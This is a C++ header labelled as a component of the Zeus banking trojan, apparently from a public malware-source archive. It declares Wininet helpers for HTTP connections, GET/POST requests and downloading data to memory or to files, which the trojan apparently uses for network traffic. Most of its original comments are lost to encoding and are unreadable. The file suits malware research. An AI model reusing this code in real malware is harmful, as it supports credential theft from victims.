/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
/*
  ����������� ��� ������ � Wininet.
*/

//The maximum amount of data allocated for skachvanie in memory.
#define WININET_MAXBYTES_TO_MEM  (10 * 1024 * 1024)

#include "mem.h"

namespace Wininet
{
  //Structure for CallURL.
  typedef struct
  {
    bool bAutoProxy;                   //Make attempts to connect with WICF_USE_IE_PROXY, then without it, for each attempt.
    BYTE bTryCount;                    //The number of attempts, at a minimum should be 1.
    DWORD dwRetryDelay;                //Delay Mezhuyev connections.
    HANDLE hStopEvent;                 //Signal priryvaniya.
    LPSTR pstrUserAgent;               //UserAgent.
    LPSTR pstrURL;                     //URL.

    DWORD Connect_dwFlags;             //Flags WICF_ *.

    LPSTR SendRequest_pstrReferer;     //Referel
    void *SendRequest_pPostData;       //Post-data.
    DWORD SendRequest_dwPostDataSize;  //The size of the settlement data.
    DWORD SendRequest_dwFlags;         //Flags WISRF_ *.

    DWORD DownloadData_dwSizeLimit;    //Limit on downloaded data.
    LPWSTR DownloadData_pstrFileName;  //If not NULL, then the downloading of data occurs in this file.
  }CALLURLDATA;

  //Flags for _Connect.
  enum
  {
    WICF_USE_IE_PROXY = 0x1 //Whether to use when connecting from the proxy settings IE.
  };

  //Flags for SendRequest.
  enum
  {
    WISRF_METHOD_GET      = 0x0, //Use the method GET. (DEFAULT)
    WISRF_METHOD_POST     = 0x1, //Use the method POST.
    WISRF_KEEP_CONNECTION = 0x2, //Maintain the connection after vypoleneniya request. This option is not
                                 //guarantees the preservation of the connection, it depends on the server.
    WISRF_IS_HTTPS        = 0x4 //This query is performed over HTTPS protocol.
  };

  /*
    �������������.
  */
  void Init(void);

  /*
    ���������������.
  */
  void Uninit(void);

  /*
    ����������� � ������� �� HTTP/HTTPS ���������.

    IN pstrUserAgent - User-Agent, ���� NULL, �� ������������� �������� �� ���������.
    IN pstrHost      - ����� �������, IP ��� �����.
    IN wPort         - ���� �������.
    IN dwFlags       - ����� WICF_*.

    Return           - ����� ���������� ��� NULL.
  */
  HINTERNET _Connect(LPSTR pstrUserAgent, LPSTR pstrHost, WORD wPort, DWORD dwFlags);

  /*
    �������� ����������, ��������� ��� ������ _Connect.

    IN hConnect - ����� ����������.
  */
  void _CloseConnection(HINTERNET hConnect);

  /*
    �������� ������, � ���� ��� ���������.

    IN OUT handle - �����.
  */
  void _closeWithParents(HINTERNET handle);

  /*
    ����� InternetStatusCallback.

    ... -  �������� InternetStatusCallback.

    Return - true - ������� �������,
             false - ������� �� �������.
  */
  bool callCallback(HINTERNET handle, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength);

  /*
    �������� �������.

    IN hConnect       - ����� ����������.
    IN pstrURI        - ������������� ������.
    IN pstrReferer    - ������� ��� NULL.
    IN pPostData      - ���� ������ ��� NULL.
    IN dwPostDataSize - ������ pPostData.
    IN dwFlags        - Flags WISRF_ *.

    Return            - � ������ ������ ����� ��������� �� HttpOpenRequest, ��� NULL � ������ ������.
  */
  HINTERNET _SendRequest(HINTERNET hConnect, LPSTR pstrURI, LPSTR pstrReferer, void *pPostData, DWORD dwPostDataSize, DWORD dwFlags);

  /*
    ���������� ������.

    IN hRequest    - ����� �������.
    OUT pBuf       - ������ ��� ������, ����� ������������� ���������� ������� ����� Mem. �����
                     ���� NULL.
    IN dwSizeLimit - ����� ����������� ����, ���� ����� 0 ��� ������ WININET_MAXBYTES_TO_MEM, ��
                     dwSizeLimit =  WININET_MAXBYTES_TO_MEM;
    IN hStopEvent  - ����� ������� ��� ���������� ���������� ��� NULL.

    Return         - true - � ������ ������,
                     false - � ������ ������, � ��� ����� ������������� hStopEvent � ����������
                     dwSizeLimit. ���� �������� ������, �� ���������� ���������� �������.
  */
  bool _DownloadData(HINTERNET hRequest, MEMDATA *pBuf, DWORD dwSizeLimit, HANDLE hStopEvent);
  
  /*
    ���������� ������ � ����.

    IN hRequest     - ����� �������.
    IN pstrFileName - ��� �����, � ������� ����� ��������� ������.
    IN dwSizeLimit  - ����� ����������� ����, ���� ����� 0, �� ����������� ���.
    IN hStopEvent   - ����� ������� ��� ���������� ���������� ��� NULL.

    Return          - true - � ������ ������,
                      false - � ������ ������, � ��� ����� ������������� hStopEvent ��� ����������
                      dwSizeLimit. ���� �������� ������, �� ���������� ���������� �������.
  */
  bool _DownloadDataToFile(HINTERNET hRequest, LPWSTR pstrFileName, DWORD dwSizeLimit, HANDLE hStopEvent);

  /*
    �������� ��� _Connect + _SendRequest + _DownloadData(ToFile).

    IN pcud  - ��������� URL;
    OUT pBuf - ������ ��� ������, ����� ������������� ���������� ������� ����� Mem. ����� ���� NULL.
               ��� pcud->DownloadData_pstrFileName != NULL �� ����� ������.

    Return   - true - � ������ ������,
               false - � ������ ������.
  */
  bool _CallURL(CALLURLDATA *pcud, MEMDATA *pBuf);

  /*
    ��������� User-Agent �� Internet Explorer.

    Return - User-Agent, ��� NULL � ������ ������. ������ ������ ���� ����������� ����� Mem.
  */
  LPSTR _GetIEUserAgent(void);

  /*
    ���� �������� �������� URL.

    IN url       - URL.
    IN stopEvent - ������� ��������� ��� NULL.

    Return       - ���������� ����� � ms, ��� 0 - � ������ ������.
  */
  DWORD _testDownloadDelay(LPSTR url, HANDLE stopEvent);

  /*
    ��������� ��� InternetQueryOptionA � �������������� ������.

    IN internet - �����.
    IN option   - �����.
    OUT lenght  - ������ ������. ���� ��� ������, ������ ����� �������� ��� ��������� �������.

    Return      - ������ (����� ���������� ����� Mem), ���� ��� ������, �� �� ����� � ���������� ��
                  ������� ������. ��� NULL � ������ ������.
  */
  void *_queryOptionExA(HINTERNET internet, DWORD option, LPDWORD lenght);

  /*
    ��������� ��� InternetQueryOptionW � �������������� ������.

    IN internet - �����.
    IN option   - �����.
    OUT lenght  - ������ ������ � ������. ���� ��� ������, ������ ����� �������� ��� ��������� �������.

    Return      - ������ (����� ���������� ����� Mem), ���� ��� ������, �� �� ����� � ���������� ��
                  ������� ������. ��� NULL � ������ ������.
  */
  void *_queryOptionExW(HINTERNET internet, DWORD option, LPDWORD lenght);

  /*    Customize over HttpQueryInfoA with avtovyledeniem memory.

    IN internet - the handle.
    IN infoLevel - flags indicating data to get.
    OUT lenght - the size of a string without the null character.

    Return - string ending in a null character (must be freed by Mem),
                  or NULL in case of error.
  */
  LPSTR _queryInfoExA(HINTERNET request, DWORD infoLevel, LPDWORD lenght, LPDWORD index);
};
